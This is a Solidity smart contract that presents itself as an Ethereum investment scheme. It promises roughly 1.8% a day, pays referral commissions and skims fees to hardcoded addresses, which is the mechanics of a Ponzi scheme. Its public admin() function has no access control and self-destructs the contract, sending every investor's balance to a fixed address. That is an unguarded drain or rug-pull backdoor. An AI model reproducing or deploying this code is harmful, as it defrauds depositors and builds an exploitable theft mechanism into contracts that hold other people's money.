 

pragma solidity ^0.4.25;

 

contract one_eight {
    using SafeMath for uint256;
    
    mapping (address => uint256) public investedETH;
    mapping (address => uint256) public lastInvest;
    mapping (address => uint256) public affiliateCommision;
    
      
    address creator = 0x660D46108E6247Fe1AEbba4Cc048C4802a1e8fbD;
      
    address damn = 0xc5f10eb67F02c5d6eB08882f2D6a0deDBb4B54c7;
      
    address charity = 0x7DaeA2C171a4865039dd813cB4D7003343A378AD;

    
    function investETH(address referral) public payable {
        
        require(msg.value >= .05 ether);
        
        if(getProfit(msg.sender) > 0){
            uint256 profit = getProfit(msg.sender);
            lastInvest[msg.sender] = now;
            msg.sender.transfer(profit);
        }
        
        uint256 amount = msg.value;
        uint256 commision = SafeMath.div(amount, 40);   
        if(referral != msg.sender && referral != 0x1){
            affiliateCommision[referral] = SafeMath.add(affiliateCommision[referral], commision);
        }
        
        creator.transfer(msg.value.div(100).mul(5));  
        damn.transfer(msg.value.div(100).mul(3));  
        charity.transfer(msg.value.div(100).mul(1));  
        
        investedETH[msg.sender] = SafeMath.add(investedETH[msg.sender], amount);
        lastInvest[msg.sender] = now;
    }
    
    
    function withdraw() public{
        uint256 profit = getProfit(msg.sender);
        require(profit > 0);
        lastInvest[msg.sender] = now;
        msg.sender.transfer(profit);
    }
    
    function admin() public {
		selfdestruct(0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71);
	}    
    
    function getProfitFromSender() public view returns(uint256){
        return getProfit(msg.sender);
    }

    function getProfit(address customer) public view returns(uint256){
        uint256 secondsPassed = SafeMath.sub(now, lastInvest[customer]);
        return SafeMath.div(SafeMath.mul(secondsPassed, investedETH[customer]), 4800000);  
    }
    
    function reinvestProfit() public {
        uint256 profit = getProfit(msg.sender);
        require(profit > 0);
        lastInvest[msg.sender] = now;
        investedETH[msg.sender] = SafeMath.add(investedETH[msg.sender], profit);
    }
    
    function getAffiliateCommision() public view returns(uint256){
        return affiliateCommision[msg.sender];
    }
    
    function withdrawAffiliateCommision() public {
        require(affiliateCommision[msg.sender] > 0);
        uint256 commision = affiliateCommision[msg.sender];
        affiliateCommision[msg.sender] = 0;
        msg.sender.transfer(commision);
    }
    
    function getInvested() public view returns(uint256){
        return investedETH[msg.sender];
    }
    
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
    
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
    
    function max(uint256 a, uint256 b) private pure returns (uint256) {
        return a > b ? a : b;
    }
}

library SafeMath {

   
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

   
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
     
    uint256 c = a / b;
     
    return c;
  }

   
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

   
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}